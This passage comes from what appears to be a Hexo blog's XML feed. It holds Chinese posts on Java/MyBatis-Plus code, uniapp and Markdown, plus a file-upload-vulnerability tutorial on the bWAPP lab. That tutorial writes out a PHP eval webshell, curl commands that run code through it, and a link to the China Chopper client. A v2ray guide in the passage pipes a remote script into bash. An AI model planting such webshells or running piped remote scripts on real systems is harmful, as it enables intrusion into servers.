&#123;</span><br><span class="line">                return ipt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new MybatisPlusException(&quot;请输入正确的&quot; + tip + &quot;！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自动生成代码</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; 代码生成器</span><br><span class="line">        AutoGenerator mpg &#x3D; new AutoGenerator();</span><br><span class="line">        &#x2F;&#x2F; TODO 全局配置</span><br><span class="line">        GlobalConfig gc &#x3D; new GlobalConfig();</span><br><span class="line">        String projectPath &#x3D; System.getProperty(&quot;user.dir&quot;);</span><br><span class="line">        &#x2F;&#x2F; 生成文件的输出目录【默认 D 盘根目录】</span><br><span class="line">        gc.setOutputDir(projectPath + &quot;&#x2F;blog&#x2F;src&#x2F;main&#x2F;java&quot;);</span><br><span class="line">        &#x2F;&#x2F; 作者</span><br><span class="line">        gc.setAuthor(&quot;CZM&quot;);</span><br><span class="line">        &#x2F;&#x2F; 是否打开输出目录</span><br><span class="line">        gc.setOpen(false);</span><br><span class="line">        &#x2F;&#x2F; controller 命名方式，注意 %s 会自动填充表实体属性</span><br><span class="line">        gc.setControllerName(&quot;%sController&quot;);</span><br><span class="line">        &#x2F;&#x2F; service 命名方式</span><br><span class="line">        gc.setServiceName(&quot;%sService&quot;);</span><br><span class="line">        &#x2F;&#x2F; serviceImpl 命名方式</span><br><span class="line">        gc.setServiceImplName(&quot;%sServiceImpl&quot;);</span><br><span class="line">        &#x2F;&#x2F; mapper 命名方式</span><br><span class="line">        gc.setMapperName(&quot;%sMapper&quot;);</span><br><span class="line">        &#x2F;&#x2F; xml 命名方式</span><br><span class="line">        gc.setXmlName(&quot;%sMapper&quot;);</span><br><span class="line">        &#x2F;&#x2F; 开启 swagger2 模式</span><br><span class="line">        gc.setSwagger2(true);</span><br><span class="line">        &#x2F;&#x2F; 是否覆盖已有文件</span><br><span class="line">        gc.setFileOverride(true);</span><br><span class="line">        &#x2F;&#x2F; 是否开启 ActiveRecord 模式</span><br><span class="line">        gc.setActiveRecord(true);</span><br><span class="line">        &#x2F;&#x2F; 是否在xml中添加二级缓存配置</span><br><span class="line">        gc.setEnableCache(false);</span><br><span class="line">        &#x2F;&#x2F; 是否开启 BaseResultMap</span><br><span class="line">        gc.setBaseResultMap(true);</span><br><span class="line">        &#x2F;&#x2F; XML columList</span><br><span class="line">        gc.setBaseColumnList(false);</span><br><span class="line">        &#x2F;&#x2F; 全局 相关配置</span><br><span class="line">        mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; TODO 数据源配置</span><br><span class="line">        DataSourceConfig dsc &#x3D; new DataSourceConfig();</span><br><span class="line">        dsc.setUrl(&quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;zm_blog?useUnicode&#x3D;true&amp;useJDBCCompliantTimezoneShift&#x3D;true&amp;useLegacyDatetimeCode&#x3D;false&amp;serverTimezone&#x3D;UTC&amp;useSSL&#x3D;true&amp;characterEncoding&#x3D;UTF-8&quot;);</span><br><span class="line">        dsc.setDriverName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">        dsc.setUsername(&quot;root&quot;);</span><br><span class="line">        dsc.setPassword(&quot;root&quot;);</span><br><span class="line">        mpg.setDataSource(dsc);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; TODO 包配置</span><br><span class="line">        PackageConfig pc &#x3D; new PackageConfig();</span><br><span class="line">        &#x2F;&#x2F; 父包名。如果为空，将下面子包名必须写全部， 否则就只需写子包名</span><br><span class="line">        pc.setParent(&quot;com.it&quot;);</span><br><span class="line">        &#x2F;&#x2F; Entity包名</span><br><span class="line">        pc.setEntity(&quot;entity&quot;);</span><br><span class="line">        &#x2F;&#x2F; Service包名</span><br><span class="line">        pc.setService(&quot;service&quot;);</span><br><span class="line">        &#x2F;&#x2F; Service Impl包名</span><br><span class="line">        pc.setServiceImpl(&quot;service.impl&quot;);</span><br><span class="line">        mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; TODO 自定义配置</span><br><span class="line">        InjectionConfig cfg &#x3D; new InjectionConfig() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void initMap() &#123;</span><br><span class="line">                &#x2F;&#x2F; to do nothing</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        &#x2F;&#x2F; 输出文件配置</span><br><span class="line">        List&lt;FileOutConfig&gt; focList &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">        focList.add(new FileOutConfig(&quot;&#x2F;templates&#x2F;mapper.xml.ftl&quot;) &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public String outputFile(TableInfo tableInfo) &#123;</span><br><span class="line">                &#x2F;&#x2F; 自定义输入文件名称</span><br><span class="line">                return projectPath + &quot;&#x2F;blog&#x2F;src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;&quot; + tableInfo.getEntityName() + &quot;Mapper.xml&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        &#x2F;&#x2F; 自定义输出文件</span><br><span class="line">        cfg.setFileOutConfigList(focList);</span><br><span class="line">        mpg.setCfg(cfg);</span><br><span class="line">        mpg.setTemplate(new TemplateConfig().setXml(null));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; TODO 策略配置</span><br><span class="line">        StrategyConfig strategy &#x3D; new StrategyConfig();</span><br><span class="line">        &#x2F;&#x2F; 数据库表映射到实体的命名策略，驼峰原则</span><br><span class="line">        strategy.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        &#x2F;&#x2F; 字数据库表字段映射到实体的命名策略，驼峰原则</span><br><span class="line">        strategy.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        &#x2F;&#x2F; 实体是否生成 serialVersionUID</span><br><span class="line">        strategy.setEntitySerialVersionUID(false);</span><br><span class="line">        &#x2F;&#x2F; 是否生成实体时，生成字段注解</span><br><span class="line">        strategy.setEntityTableFieldAnnotationEnable(true);</span><br><span class="line">        &#x2F;&#x2F; 使用lombok</span><br><span class="line">        strategy.setEntityLombokModel(true);</span><br><span class="line">        &#x2F;&#x2F; 设置逻辑删除键</span><br><span class="line">        strategy.setLogicDeleteFieldName(&quot;del_flag&quot;);</span><br><span class="line">        &#x2F;&#x2F; TODO 指定生成的bean的数据库表名</span><br><span class="line">        strategy.setInclude(scanner(&quot;表名，多个英文逗号分割&quot;).split(&quot;,&quot;));</span><br><span class="line">        &#x2F;&#x2F; 驼峰转连字符</span><br><span class="line">        strategy.setControllerMappingHyphenStyle(true);</span><br><span class="line">        mpg.setStrategy(strategy);</span><br><span class="line">        &#x2F;&#x2F; 选择 freemarker 引擎需要指定如下加，注意 pom 依赖必须有！</span><br><span class="line">        mpg.setTemplateEngine(new FreemarkerTemplateEngine());</span><br><span class="line">        mpg.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取登录用户id和姓名"><a href="#获取登录用户id和姓名" class="headerlink" title="获取登录用户id和姓名"></a>获取登录用户id和姓名</h1><p><img src="/images/pasted-9.png" alt="upload successful"></p><h1 id="list根据list过滤"><a href="#list根据list过滤" class="headerlink" title="list根据list过滤"></a>list根据list过滤</h1> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; resList = list1 .stream().filter(<span class="keyword">new</span> Predicate&lt;User&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(User u)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//如根据name过滤</span></span><br><span class="line">                <span class="keyword">for</span> (User user : list2) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(u.getName().equals(user.getName()))&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><h1 id="Java数字位数不足前面补0"><a href="#Java数字位数不足前面补0" class="headerlink" title="Java数字位数不足前面补0"></a>Java数字位数不足前面补0</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">6</span>; </span><br><span class="line">        DecimalFormat decimalFormat = <span class="keyword">new</span> DecimalFormat(<span class="string">&quot;000000&quot;</span>);</span><br><span class="line">        String numFormat= decimalFormat .format(num);</span><br><span class="line">        System.out.println(numFormat);<span class="comment">//打印结果&quot;000006&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="java处理mysql中JSON类型的数据"><a href="#java处理mysql中JSON类型的数据" class="headerlink" title="java处理mysql中JSON类型的数据"></a>java处理mysql中JSON类型的数据</h1><p>实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tk.mybatis.mapper.annotation.ColumnType;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.context.ObjectJsonHandler;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="meta">@ColumnType(typeHandler = ObjectJsonHandler.class)</span></span><br><span class="line">    <span class="keyword">private</span> JSON dataJson;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务类赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line">....部分代码省略...</span><br><span class="line">Test upData=<span class="keyword">new</span> Test();</span><br><span class="line">upData.setDataJson((JSON) JSONObject.toJSON(json));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="返回树形结构的数据"><a href="#返回树形结构的数据" class="headerlink" title="返回树形结构的数据"></a>返回树形结构的数据</h1><h2 id="使用Hutool-TreeUtil-实现"><a href="#使用Hutool-TreeUtil-实现" class="headerlink" title="使用Hutool TreeUtil 实现"></a>使用Hutool TreeUtil 实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;XikYu&#x2F;article&#x2F;details&#x2F;128715929?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-128715929-blog-127101547.pc_relevant_3mothn_strategy_recovery&amp;spm&#x3D;1001.2101.3001.4242.1&amp;utm_relevant_index&#x3D;3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 树形结构数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: CZM</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Param</span>: []</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Tree&lt;String&gt;&gt; findNodeAll() &#123;</span><br><span class="line">    List&lt;IndustryNode&gt; list = industryNodeMapper.selectAll();</span><br><span class="line">    List&lt;IndustryNode&gt; list2 = CollUtil.newArrayList();</span><br><span class="line">    <span class="comment">//浅拷贝赋值</span></span><br><span class="line">    list2.addAll(list);</span><br><span class="line">    <span class="comment">// rootId</span></span><br><span class="line">    String pid = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="comment">//配置</span></span><br><span class="line">    TreeNodeConfig nodeConfig = <span class="keyword">new</span> TreeNodeConfig();</span><br><span class="line">    <span class="comment">// 自定义属性名 都要默认值的</span></span><br><span class="line">    <span class="comment">//设置ID对应的名称</span></span><br><span class="line">    nodeConfig.setIdKey(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="comment">// 最大递归深度 4级目录</span></span><br><span class="line">    nodeConfig.setDeep(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//转换器</span></span><br><span class="line">    List&lt;Tree&lt;String&gt;&gt; treeList = TreeUtil.build(list2, pid, nodeConfig,</span><br><span class="line">            (node, tree) -&gt; &#123;</span><br><span class="line">                <span class="comment">//id</span></span><br><span class="line">                tree.setId(node.getId().toString());</span><br><span class="line">                <span class="comment">//名称</span></span><br><span class="line">                tree.setName(node.getTagName());</span><br><span class="line">                <span class="comment">//获取父节点id</span></span><br><span class="line">                tree.setParentId(node.getParentId().toString());</span><br><span class="line">            &#125;);</span><br><span class="line">    <span class="keyword">for</span> (Tree&lt;String&gt; tree : treeList) &#123;</span><br><span class="line">        setLevel(tree, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> treeList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置层级</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: CZM</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Param</span>: [tree, level]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLevel</span><span class="params">(Tree&lt;String&gt; tree, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tree.putExtra(<span class="string">&quot;level&quot;</span>, level);</span><br><span class="line">    List&lt;Tree&lt;String&gt;&gt; children = tree.getChildren();</span><br><span class="line">    <span class="keyword">if</span> (children != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Tree&lt;String&gt; child : children) &#123;</span><br><span class="line">            setLevel(child, level + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>uniapp自定义组件</title>
      <link href="/2021/04/05/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/"/>
      <url>/2021/04/05/guan-yu-uniapp-zhong-zi-ding-yi-zu-jian-de-feng-zhuang-ji-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、步骤"><a href="#一、步骤" class="headerlink" title="一、步骤"></a>一、步骤</h1><h2 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1.新建文件夹"></a>1.新建文件夹</h2><p>在项目中右键新建名为 <b> components </b> 的文件夹<br><img src="https://img-blog.csdnimg.cn/20210410211321743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><h2 id="2-新建Vue文件并封装"><a href="#2-新建Vue文件并封装" class="headerlink" title="2.新建Vue文件并封装"></a>2.新建Vue文件并封装</h2><p>文件名即可为自定义组件名（zdy.vue），<br><img src="https://img-blog.csdnimg.cn/20210410213739969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><h2 id="3-自定义组件使用"><a href="#3-自定义组件使用" class="headerlink" title="3.自定义组件使用"></a>3.自定义组件使用</h2><p><img src="https://img-blog.csdnimg.cn/2021041021222144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210410212437520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 小程序 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uniapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞[一]</title>
      <link href="/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/"/>
      <url>/2021/03/15/web-an-quan-yi-wen-jian-shang-chuan-lou-dong-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、文件上传漏洞概述"><a href="#一、文件上传漏洞概述" class="headerlink" title="一、文件上传漏洞概述"></a>一、文件上传漏洞概述</h2><p>  文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。</p><p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。</p><hr><h2 id="二、编辑木马文件并上传"><a href="#二、编辑木马文件并上传" class="headerlink" title="二、编辑木马文件并上传"></a>二、编辑木马文件并上传</h2><h3 id="1-eval函数"><a href="#1-eval函数" class="headerlink" title="1.eval函数"></a>1.eval函数</h3><p>eval( string $code)</p><p>把字符串 code 作为PHP代码执行。函数eval()语言结构允许执行任意 PHP 代码。code为 需要被执行的字符串 。</p><p>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</p><hr><h3 id="2-PHP一句话木马"><a href="#2-PHP一句话木马" class="headerlink" title="2.PHP一句话木马"></a>2.PHP一句话木马</h3><pre><code>&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</code></pre><p>新建文本文件写入PHP一句话木马，并将txt后缀改为php.</p><p><img src="https://img-blog.csdnimg.cn/20210314115226333.png"></p><hr><h3 id="3-上传PHP文件"><a href="#3-上传PHP文件" class="headerlink" title="3.上传PHP文件"></a>3.上传PHP文件</h3><p>登录bwapp靶场后选择Unrestricted File Upload,文件上传漏洞上传文件，上传后可以看到路径为   靶场路径+/images/shell.php</p><p><img src="https://img-blog.csdnimg.cn/20210314115551830.png"><br><img src="https://img-blog.csdnimg.cn/20210314115616674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr><h3 id="4-webshell执行命令"><a href="#4-webshell执行命令" class="headerlink" title="4.webshell执行命令"></a>4.webshell执行命令</h3><p>在cmd执行</p><pre><code>curl -d &quot;hacker=echo get_current_user();&quot; 靶场路径/images/shell.phpcurl -d &quot;hacker=echo getcwd();&quot; 靶场路径/images/shell.php</code></pre><p>get_current_user — 获取当前 PHP 脚本所有者名称</p><p>getcwd — 取得当前工作目录。<br><img src="https://img-blog.csdnimg.cn/20210314115808496.png"></p><hr><h3 id="5-使用中国菜刀连接"><a href="#5-使用中国菜刀连接" class="headerlink" title="5.使用中国菜刀连接"></a>5.使用中国菜刀连接</h3><p>下载链接：<a href="https://github.com/raddyfiy/caidao-official-version">https://github.com/raddyfiy/caidao-official-version</a></p><p>打开软件后，右键添加SHELL连接即可。</p><p><img src="https://img-blog.csdnimg.cn/20210314120042500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210314120010248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr><h3 id="6-不同语言一句话木马"><a href="#6-不同语言一句话木马" class="headerlink" title="6.不同语言一句话木马"></a>6.不同语言一句话木马</h3><p><img src="https://img-blog.csdnimg.cn/20210314120109482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于java环境重装的问题</title>
      <link href="/2021/03/01/java-huan-jing-chong-zhuang/"/>
      <url>/2021/03/01/java-huan-jing-chong-zhuang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>由于上次加装固态硬盘，导致java环境失效，所以将其卸载重装。 </p></blockquote><hr><h2 id="java环境变量配置"><a href="#java环境变量配置" class="headerlink" title="java环境变量配置"></a>java环境变量配置</h2><pre><code>#添加系统变量新建变量名：JAVA_HOME 变量值：java安装路径，如F:\Program Files\Java\jdk1.8.0_221新建变量名：classpath 变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar (前面的.不要漏掉)在Path变量中加入变量值：.;%JAVA_HOME%\bin;（加在最前面）</code></pre><hr><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><pre><code>Error: opening registry key &#39;Software\JavaSoft\JavaRuntime Environment&#39; Error: could not find java.dllError: Could not find Java SE Runtime Environment. </code></pre><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul><li>Windows键+r 输入regedit打开注册表</li><li>依次进入目录HKEY_LOCAL_MACHINE—–&gt;SOFTWARE—–&gt;JavaSoft—–&gt;Java Development Kit</li><li>查看文件，将旧的文件删除</li><li>进入C:\Windows\System32找到java.exe和javaw.exe并将它们删除（地址栏中输入**%SystemRoot%\system32**也可进入该路径）</li><li>cmd命令行运行java -version验证环境是否配置成功。</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云香港轻量云服务器使用笔记</title>
      <link href="/2021/02/28/v2ray/"/>
      <url>/2021/02/28/v2ray/</url>
      
        <content type="html"><![CDATA[<h2 id="v2ray搭建"><a href="#v2ray搭建" class="headerlink" title="v2ray搭建"></a>v2ray搭建</h2><p>1.购买<strong>香港</strong>地区的轻量云服务器（Centos7+）后，开启全部的tcp和udp端口。如下图  </p><p><img src="/images/v2ray/1.png"><br><img src="/images/v2ray/2.png"></p><p>2.远程登录云服务器，运行如下命令  </p><pre><code>sudo -ibash &lt;(curl -Ls https://blog.sprov.xyz/v2-ui.sh)</code></pre><p><img src="/images/v2ray/3.png"><br><img src="/images/v2ray/4.png"><br><img src="/images/v2ray/5.png">  </p><p>3.安装完成后输入云服务器公网ip:65432进入后台，用户名密码都为admin<br><img src="/images/v2ray/6.png"><br>4.进入后台后添加账号，然后导入v2ray即可。<br><img src="/images/v2ray/7.png"><br><img src="/images/v2ray/8.png"></p><hr><h2 id="部署谷歌bbr加速"><a href="#部署谷歌bbr加速" class="headerlink" title="部署谷歌bbr加速"></a>部署谷歌bbr加速</h2><h3 id="升级Centos7内核"><a href="#升级Centos7内核" class="headerlink" title="升级Centos7内核"></a>升级Centos7内核</h3><p>内核不可低于 4.9.0<br>1.输入如下命令查看内核版本</p><pre><code>uname -r</code></pre><p>2.分别输入如下命令安装内核</p><pre><code>sudo rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.orgsudo rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpmsudo yum --enablerepo=elrepo-kernel install kernel-ml -y</code></pre><p>3.显示grub2菜单中的所有条目：</p><pre><code>sudo egrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \&#39;</code></pre><p>4.从3命令显示的条目中选择要更换的内核版本，设第一个条目为0正好是我们需要的内核。则输入如下命令（第二个就为1，以此类推）</p><pre><code>sudo grub2-set-default 0</code></pre><p>5.重启系统</p><pre><code>sudo shutdown -r now</code></pre><p>6.查看内核是否更换成功(不低于4.9.0)</p><pre><code>uname -r</code></pre><hr><h3 id="启用BBR加速"><a href="#启用BBR加速" class="headerlink" title="启用BBR加速"></a>启用BBR加速</h3><p>1.输入如下命令修改配置</p><pre><code>echo &#39;net.core.default_qdisc=fq&#39; | sudo tee -a /etc/sysctl.confecho &#39;net.ipv4.tcp_congestion_control=bbr&#39; | sudo tee -a /etc/sysctl.confsudo sysctl -p</code></pre><p>2.确认已启用bbr</p><pre><code>sudo sysctl net.ipv4.tcp_available_congestion_control</code></pre><p>3.验证</p><pre><code>lsmod | grep bbr</code></pre><p>结果类似如下即成功开启bbr</p><pre><code>tcp_bbr                16384  0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 云服务器 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown笔记</title>
      <link href="/2021/02/22/markdown-bi-ji/"/>
      <url>/2021/02/22/markdown-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="博客开头"><a href="#博客开头" class="headerlink" title="博客开头"></a>博客开头</h2><pre><code>title: 文章标题tags: - 标签1- 标签2categories: - 分类1- 分类2date: 发布日期updated: 更新日期summary: 文章摘要img: 文章封面author: 作者top: true    文章是否置顶，值为 true，则会作为首页推荐文章cover: false    是否需要加入到首页轮播封面中coverImg: 加入首页轮播后封面图片路径</code></pre><hr><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><pre><code># 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 </code></pre><h3 id="hexo-theme-matery多级目录"><a href="#hexo-theme-matery多级目录" class="headerlink" title="hexo-theme-matery多级目录"></a>hexo-theme-matery多级目录</h3><pre><code>## 一级目录### 二级目录</code></pre><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><pre><code>段落的换行是使用两个以上空格加上回车</code></pre><h3 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h3><pre><code>***或- - -等</code></pre><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><pre><code>~~文本~~</code></pre><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><pre><code>&lt;u&gt;文本&lt;/u&gt;</code></pre><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><pre><code>*斜体文本***粗体文本*****粗斜体文本***</code></pre><h3 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h3><pre><code>&gt; 块名称多段落块在块之间加 &gt;块中块：多加 &gt;区块中可使用列表</code></pre><h3 id="列表"><a href="#列表" 